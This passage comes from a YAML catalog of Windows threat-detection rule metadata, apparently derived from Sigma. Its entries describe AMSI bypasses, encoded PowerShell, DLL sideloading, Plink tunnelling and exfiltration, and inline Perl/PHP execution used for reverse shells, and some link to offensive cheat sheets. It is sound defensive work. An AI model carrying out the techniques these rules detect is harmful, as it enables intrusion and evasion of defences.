  - https://github.com/splunk/security_content/blob/300af51b88ad5d5b27ce4f5f54e4d6e6a3a2c06d/detections/endpoint/office_spawning_control.yml
  - https://twitter.com/andythevariable/status/1576953781581144064?s=20&t=QiJILvK4ZiBdR8RJe24u-A
  - https://www.elastic.co/security-labs/exploring-the-ref2731-intrusion-set
  - https://github.com/elastic/detection-rules/blob/c76a39796972ecde44cb1da6df47f1b6562c9770/rules/windows/defense_evasion_execution_msbuild_started_by_office_app.toml
  - https://www.vmray.com/analyses/2d2fa29185ad/report/overview.html
  - https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/
  false_positives:
  - Unknown
  notes: ''
- detection_id: f7375e28-5c14-432f-b8d1-1db26c832df3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_office_winword_dll_load.yml
  name: Potential Arbitrary DLL Load Using Winword
  description: Detects potential DLL sideloading using the Microsoft Office winword
    process via the '/l' flag.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1202
  tags:
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - https://github.com/D4Vinci/One-Lin3r/blob/9fdfa5f0b9c698dfbd4cdfe7d2473192777ae1c6/one_lin3r/core/liners/windows/cmd/dll_loader_word.py
  false_positives:
  - Unknown
  notes: ''
- detection_id: 02b18447-ea83-4b1b-8805-714a8a34546a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_offlinescannershell_mpclient_sideloading.yml
  name: Potential Mpclient.DLL Sideloading Via OfflineScannerShell.EXE Execution
  description: 'Detects execution of Windows Defender "OfflineScannerShell.exe" from
    its non standard directory.

    The "OfflineScannerShell.exe" binary is vulnerable to DLL side loading and will
    load any DLL named "mpclient.dll" from the current working directory.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/OfflineScannerShell/
  false_positives:
  - Unknown
  notes: ''
- detection_id: d679950c-abb7-43a6-80fb-2a480c4fc450
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pdqdeploy_execution.yml
  name: PDQ Deploy Remote Adminstartion Tool Execution
  description: Detect use of PDQ Deploy remote admin tool
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1072
  tags:
  - attack.execution
  - attack.lateral-movement
  - attack.t1072
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/9e5b12c4912c07562aec7500447b11fa3e17e254/atomics/T1072/T1072.md
  - https://www.pdq.com/pdq-deploy/
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: 12b8e9f5-96b2-41e1-9a42-8c6779a5c184
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pdqdeploy_runner_susp_children.yml
  name: Potentially Suspicious Execution Of PDQDeployRunner
  description: Detects suspicious execution of "PDQDeployRunner" which is part of
    the PDQDeploy service stack that is responsible for executing commands and packages
    on a remote machines
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://twitter.com/malmoeb/status/1550483085472432128
  false_positives:
  - Legitimate use of the PDQDeploy tool to execute these commands
  notes: ''
- detection_id: f426547a-e0f7-441a-b63e-854ac5bdf54d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_perl_inline_command_execution.yml
  name: Perl Inline Command Execution
  description: Detects execution of perl using the "-e"/"-E" flags. This is could
    be used as a way to launch a reverse shell or execute live perl code.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
  - https://www.revshells.com/
  false_positives:
  - Unknown
  notes: ''
- detection_id: d81871ef-5738-47ab-9797-7a9c90cd4bfb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_php_inline_command_execution.yml
  name: Php Inline Command Execution
  description: Detects execution of php using the "-r" flag. This is could be used
    as a way to launch a reverse shell or execute live php code.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://www.php.net/manual/en/features.commandline.php
  - https://www.revshells.com/
  - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1a0d4aba-7668-4365-9ce4-6d79ab088dfd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_ping_hex_ip.yml
  name: Ping Hex IP
  description: Detects a ping command that uses a hex encoded IP address
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027
  - T1140
  tags:
  - attack.defense-evasion
  - attack.t1140
  - attack.t1027
  time_window: ''
  references:
  - https://github.com/vysecurity/Aggressor-VYSEC/blob/0d61c80387b9432dab64b8b8a9fb52d20cfef80e/ping.cna
  - https://twitter.com/vysecurity/status/977198418354491392
  false_positives:
  - Unlikely, because no sane admin pings IP addresses in a hexadecimal form
  notes: ''
- detection_id: f956c7c1-0f60-4bc5-b7d7-b39ab3c08908
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pktmon_execution.yml
  name: PktMon.EXE Execution
  description: Detects execution of PktMon, a tool that captures network packets.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1040
  tags:
  - attack.discovery
  - attack.credential-access
  - attack.t1040
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Pktmon/
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: 48a61b29-389f-4032-b317-b30de6b95314
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_plink_port_forwarding.yml
  name: Suspicious Plink Port Forwarding
  description: Detects suspicious Plink tunnel port forwarding to a local port
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1021.001
  - T1572
  tags:
  - attack.command-and-control
  - attack.t1572
  - attack.lateral-movement
  - attack.t1021.001
  time_window: ''
  references:
  - https://www.real-sec.com/2019/04/bypassing-network-restrictions-through-rdp-tunneling/
  - https://medium.com/@informationsecurity/remote-ssh-tunneling-with-plink-exe-7831072b3d7d
  false_positives:
  - Administrative activity using a remote port forwarding to a local port
  notes: ''
- detection_id: f38ce0b9-5e97-4b47-a211-7dc8d8b871da
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_plink_susp_tunneling.yml
  name: Potential RDP Tunneling Via Plink
  description: Execution of plink to perform data exfiltration and tunneling
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1572
  tags:
  - attack.command-and-control
  - attack.t1572
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/
  false_positives:
  - Unknown
  notes: ''
- detection_id: f8d6a15e-4bc8-4c27-8e5d-2b10f0b73e5b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powercfg_execution.yml
  name: Suspicious Powercfg Execution To Change Lock Screen Timeout
  description: Detects suspicious execution of 'Powercfg.exe' to change lock screen
    timeout
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html
  - https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/powercfg-command-line-options
  false_positives:
  - Unknown
  notes: ''
- detection_id: c86500e9-a645-4680-98d7-f882c70c1ea3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_aadinternals_cmdlets_execution.yml
  name: AADInternals PowerShell Cmdlets Execution - ProccessCreation
  description: Detects ADDInternals Cmdlet execution. A tool for administering Azure
    AD and Office 365. Which can be abused by threat actors to attack Azure AD or
    Office 365.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 8
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  - multi_signal_correlation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Execution
  - Impact
  - Reconnaissance
  techniques: []
  tags:
  - attack.execution
  - attack.reconnaissance
  - attack.discovery
  - attack.credential-access
  - attack.impact
  time_window: ''
  references:
  - https://o365blog.com/aadinternals/
  - https://github.com/Gerenios/AADInternals
  false_positives:
  - Legitimate use of the library for administrative activity
  notes: ''
- detection_id: 70bc5215-526f-4477-963c-a47a5c9ebd12
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_active_directory_module_dll_import.yml
  name: Potential Active Directory Enumeration Using AD Module - ProcCreation
  description: Detects usage of the "Import-Module" cmdlet to load the "Microsoft.ActiveDirectory.Management.dl"
    DLL. Which is often used by attackers to perform AD enumeration.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Impact
  - Reconnaissance
  techniques: []
  tags:
  - attack.reconnaissance
  - attack.discovery
  - attack.impact
  time_window: ''
  references:
  - https://github.com/samratashok/ADModule
  - https://twitter.com/cyb3rops/status/1617108657166061568?s=20
  - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-enumeration-with-ad-module-without-rsat-or-admin-privileges
  false_positives:
  - Legitimate use of the library for administrative activity
  notes: ''
- detection_id: b36d01a3-ddaf-4804-be18-18a6247adfcd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_add_windows_capability.yml
  name: Add Windows Capability Via PowerShell Cmdlet
  description: Detects usage of the "Add-WindowsCapability" cmdlet to add Windows
    capabilities. Notable capabilities could be "OpenSSH" and others.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_install_firstuse?tabs=powershell
  - https://www.virustotal.com/gui/file/af1c82237b6e5a3a7cdbad82cc498d298c67845d92971bada450023d1335e267/content
  false_positives:
  - Legitimate usage of the capabilities by administrators or users. Add additional
    filters accordingly.
  notes: ''
- detection_id: 30edb182-aa75-42c0-b0a9-e998bb29067c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_amsi_init_failed_bypass.yml
  name: Potential AMSI Bypass Via .NET Reflection
  description: Detects Request to "amsiInitFailed" that can be used to disable AMSI
    Scanning
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/
  - https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 92a974db-ab84-457f-9ec0-55db83d7a825
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_amsi_null_bits_bypass.yml
  name: Potential AMSI Bypass Using NULL Bits
  description: Detects usage of special strings/null bits in order to potentially
    bypass AMSI functionalities
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://github.com/r00t-3xp10it/hacking-material-books/blob/43cb1e1932c16ff1f58b755bc9ab6b096046853f/obfuscation/simple_obfuscation.md#amsi-bypass-using-null-bits-satoshi
  false_positives:
  - Unknown
  notes: ''
- detection_id: 932fb0d8-692b-4b0f-a26e-5643a50fe7d6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_audio_capture.yml
  name: Audio Capture via PowerShell
  description: Detects audio capture via PowerShell Cmdlet.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1123
  tags:
  - attack.collection
  - attack.t1123
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1123/T1123.md
  - https://eqllib.readthedocs.io/en/latest/analytics/ab7a6ef4-0983-4275-a4f1-5c6bd3c31c23.html
  - https://github.com/frgnca/AudioDeviceCmdlets
  false_positives:
  - Legitimate audio capture by legitimate user.
  notes: ''
- detection_id: ca2092a1-c273-4878-9b4b-0d60115bf5ea
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_base64_encoded_cmd.yml
  name: Suspicious Encoded PowerShell Command Line
  description: Detects suspicious powershell process starts with base64 encoded commands
    (e.g. Emotet)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://app.any.run/tasks/6217d77d-3189-4db2-a957-8ab239f3e01e
  false_positives: []
  notes: ''
- detection_id: b9d9cc83-380b-4ba3-8d8f-60c0e7e2930c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_base64_encoded_cmd_patterns.yml
  name: Suspicious PowerShell Encoded Command Patterns
  description: Detects PowerShell command line patterns in combincation with encoded
    commands that often appear in malware infection chains
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://app.any.run/tasks/b9040c63-c140-479b-ad59-f1bb56ce7a97/
  false_positives:
  - Other tools that work with encoded scripts in the command line instead of script
    files
  notes: ''
- detection_id: 8d01b53f-456f-48ee-90f6-bc28e67d4e35
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_base64_encoded_obfusc.yml
  name: Suspicious Obfuscated PowerShell Code
  description: Detects suspicious UTF16 and base64 encoded and often obfuscated PowerShell
    code often used in command lines
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://app.any.run/tasks/fcadca91-3580-4ede-aff4-4d2bf809bf99/
  false_positives:
  - Unknown
  notes: ''
- detection_id: fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_base64_frombase64string.yml
  name: PowerShell Base64 Encoded FromBase64String Cmdlet
  description: Detects usage of a base64 encoded "FromBase64String" cmdlet in a process
    command line
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1140
  tags:
  - attack.defense-evasion
  - attack.t1140
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: f26c6093-6f14-4b12-800f-0fcb46f5ffd0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_base64_hidden_flag.yml
  name: Malicious Base64 Encoded PowerShell Keywords in Command Lines
  description: Detects base64 encoded strings used in hidden malicious PowerShell
    command lines
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - http://www.leeholmes.com/blog/2017/09/21/searching-for-content-in-base-64-strings/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 88f680b8-070e-402c-ae11-d2914f2257f1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_base64_iex.yml
  name: PowerShell Base64 Encoded IEX Cmdlet
  description: Detects usage of a base64 encoded "IEX" cmdlet in a process command
    line
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6385697e-9f1b-40bd-8817-f4a91f40508e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_base64_invoke.yml
  name: PowerShell Base64 Encoded Invoke Keyword
  description: Detects UTF-8 and UTF-16 Base64 encoded powershell 'Invoke-' calls
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense-evasion
  - attack.t1027
  time_window: ''
  references:
  - https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/
  false_positives:
  - Unknown
  notes: ''
- detection_id: c6fb44c6-71f5-49e6-9462-1425d328aee3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_base64_mppreference.yml
  name: Powershell Base64 Encoded MpPreference Cmdlet
  description: Detects base64 encoded "MpPreference" PowerShell cmdlet code that tries
    to modifies or tamper with Windows Defender AV
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-endpoint/configure-process-opened-file-exclusions-microsoft-defender-antivirus
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md
  - https://twitter.com/AdamTheAnalyst/status/1483497517119590403
  false_positives:
  - Unknown
  notes: ''
- detection_id: 62b7ccc9-23b4-471e-aa15-6da3663c4d59
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_base64_reflection_assembly_load.yml
  name: PowerShell Base64 Encoded Reflective Assembly Load
  description: Detects base64 encoded .NET reflective loading of Assembly
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  - T1620
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense-evasion
  - attack.t1027
  - attack.t1620
  time_window: ''
  references:
  - https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/mal_revil.yar
  - https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 9c0295ce-d60d-40bd-bd74-84673b7592b1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_base64_reflection_assembly_load_obfusc.yml
  name: Suspicious Encoded And Obfuscated Reflection Assembly Load Function Call
  description: Detects suspicious base64 encoded and obfuscated "LOAD" keyword used
    in .NET "reflection.assembly"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1059.001
  - attack.t1027
  time_window: ''
  references:
  - https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/mal_revil.yar
  - https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/
  - https://learn.microsoft.com/en-us/dotnet/api/system.appdomain.load?view=net-7.0
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 1816994b-42e1-4fb1-afd2-134d88184f71
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_base64_wmi_classes.yml
  name: PowerShell Base64 Encoded WMI Classes
  description: Detects calls to base64 encoded WMI class such as "Win32_ShadowCopy",
    "Win32_ScheduledJob", etc.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense-evasion
  - attack.t1027
  time_window: ''
  references:
  - https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/mal_revil.yar
  false_positives:
  - Unknown
  notes: ''
- detection_id: a0459f02-ac51-4c09-b511-b8c9203fc429
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_cl_invocation.yml
  name: Potential Process Execution Proxy Via CL_Invocation.ps1
  description: Detects calls to "SyncInvoke" that is part of the "CL_Invocation.ps1"
    script to proxy execution using "System.Diagnostics.Process"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1216
  tags:
  - attack.defense-evasion
  - attack.t1216
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Scripts/Cl_invocation/
  - https://twitter.com/bohops/status/948061991012327424
  false_positives:
  - Unknown
  notes: ''
- detection_id: c57872c7-614f-4d7f-a40d-b78c8df2d30d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_cl_loadassembly.yml
  name: Assembly Loading Via CL_LoadAssembly.ps1
  description: Detects calls to "LoadAssemblyFromPath" or "LoadAssemblyFromNS" that
    are part of the "CL_LoadAssembly.ps1" script. This can be abused to load different
    assemblies and bypass App locker controls.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1216
  tags:
  - attack.defense-evasion
  - attack.t1216
  time_window: ''
  references:
  - https://bohops.com/2018/01/07/executing-commands-and-bypassing-applocker-with-powershell-diagnostic-scripts/
  - https://lolbas-project.github.io/lolbas/Scripts/CL_LoadAssembly/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1e0e1a81-e79b-44bc-935b-ddb9c8006b3d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_cl_mutexverifiers.yml
  name: Potential Script Proxy Execution Via CL_Mutexverifiers.ps1
  description: Detects the use of the Microsoft signed script "CL_mutexverifiers"
    to proxy the execution of additional PowerShell script commands
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1216
  tags:
  - attack.defense-evasion
  - attack.t1216
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Scripts/CL_mutexverifiers/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 74403157-20f5-415d-89a7-c505779585cf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_cmdline_convertto_securestring.yml
  name: ConvertTo-SecureString Cmdlet Usage Via CommandLine
  description: Detects usage of the "ConvertTo-SecureString" cmdlet via the commandline.
    Which is fairly uncommon and could indicate potential suspicious activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=65
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7.3#examples
  false_positives:
  - Legitimate use to pass password to different powershell commands
  notes: ''
- detection_id: b6b49cd1-34d6-4ead-b1bf-176e9edba9a4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_cmdline_reversed_strings.yml
  name: Potential PowerShell Obfuscation Via Reversed Commands
  description: Detects the presence of reversed PowerShell commands in the CommandLine.
    This is often used as a method of obfuscation by attackers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
